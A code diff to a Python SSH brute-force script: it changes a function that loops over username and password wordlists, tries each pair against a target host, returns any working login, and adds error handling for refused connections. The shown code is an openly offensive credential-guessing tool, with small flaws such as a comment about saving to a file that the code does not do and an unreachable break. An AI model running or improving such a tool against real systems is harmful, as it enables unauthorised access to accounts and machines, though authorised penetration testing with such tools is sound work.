@@ -49,14 +49,17 @@ def brute_force(host, port):
     passlist = open('passwords.txt').read().splitlines()
     userlist = open('usernames.txt').read().splitlines()
     # brute-force
-    for username in userlist:
-        for password in passlist:
-            if is_ssh_open(host, username, password, port):
-                # if combo is valid, save it to a file
-                return f"Successfully logged in with {username}@{host}:{password}"
-                break
+    try:
+        for username in userlist:
+            for password in passlist:
+                if is_ssh_open(host, username, password, port):
+                    # if combo is valid, save it to a file
+                    return f"Successfully logged in with {username}@{host}:{password}"
+                    break
 
-    return "Failed to log in."
+        return "Failed to log in. Exhausted all different username/password combinations."
+    except:
+        return f"Could not connect to port {port} on {host}."
 
 
 if __name__ == "__main__":
